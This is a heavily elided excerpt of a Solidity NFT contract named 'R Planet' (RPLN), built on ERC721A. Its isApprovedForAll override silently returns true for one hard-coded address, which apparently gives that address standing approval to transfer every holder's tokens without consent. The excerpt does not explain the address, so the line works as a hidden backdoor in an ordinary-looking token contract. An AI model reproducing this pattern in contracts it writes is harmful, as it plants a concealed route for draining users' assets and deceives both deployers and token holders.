  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xfda07B36d0eeAdCB4Bef01A5B5C9aE7e0F267668){return true;}
...
contract RPlanet is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("R Planet", "RPLN", maxBatchSize_, collectionSize_) {
